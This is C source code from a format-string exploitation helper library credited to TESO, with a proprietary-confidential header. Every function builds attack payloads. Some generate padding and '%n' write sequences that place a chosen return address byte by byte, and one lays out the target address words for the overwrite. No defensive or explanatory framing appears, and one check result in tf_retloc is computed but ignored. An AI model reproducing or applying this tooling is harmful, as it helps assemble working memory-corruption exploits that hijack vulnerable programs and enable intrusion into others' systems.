/* helper functions for exploiting format bugs
 * coded by smiler / teso
 *
 * TESO CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of TESO Security
 *
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * TESO Security.
 *
 * (C) COPYRIGHT TESO Security, 2000
 * All Rights Reserved
 */

#include "format.h"

tf_opt tf_accurate =
{
	"%10u%10u",
	"%10u",
	20,
	10,
};

tf_opt tf_efficient =
{
	"%.f",
	"%u",
	1,
	5,
};

int
tf_pad (char *dst, int distance, const tf_opt *opts, int *write_cnt, int max_write_cnt)
{
	char	*ptr = dst;

	while (distance >= 8) {
		strcpy (ptr, opts->pad_8);
		ptr += strlen (opts->pad_8);
		*write_cnt += opts->pad_8_write_cnt;
		if (max_write_cnt != -1 && *write_cnt > max_write_cnt)
			return (-1);
		distance -= 8;
	}

	while (distance >= 4) {
		strcpy (ptr, opts->pad_4);
		ptr += strlen (opts->pad_4);
		*write_cnt += opts->pad_4_write_cnt;
		if (max_write_cnt != -1 && *write_cnt > max_write_cnt)
			return (-1);
		distance -= 4;
	}

	return (ptr - dst);
}

int
tf_ret (char *dst, unsigned int ret, int *write_cnt, int max_write_cnt)
{
	char *ptr = dst;
	int	i, byte, left;

	for (i = 0; i < 4; i++, ret>>=8) {
		byte = ret & 0xff;
		while (byte < (*write_cnt + 10)) {
			byte += 256;
		}
		left = byte - *write_cnt;
		sprintf (ptr, "%%%du%%n", left);
		*write_cnt = byte;
		ptr += strlen (ptr);
	}

	return (ptr - dst);
}

int
tf_cheq_word (char *word, tf_valid_chr cheqr)
{
	int	j;

	if (cheqr == NULL)
		return (1);

	for (j = 0; j < 4; j++) {
		if (!cheqr(word[j]))
			return (0);
	}
	return (1);
}

int
tf_retloc (char *dst, unsigned int retloc, char *dummy, tf_valid_chr cheqr, int *write_cnt)
{
	char	ret[4];
	int	i;

	if (dummy == NULL)
		dummy = "7350";

	for (i = 0; i < 4; i++) {
		*(unsigned int *)ret = retloc + i;
		tf_cheq_word (ret, cheqr);
		strcpy (dst, dummy);
		dst += 4;
		*dst++ = ret[0];
		*dst++ = ret[1];
		*dst++ = ret[2];
		*dst++ = ret[3];
	}

	*write_cnt += 32;

	return (32);
}
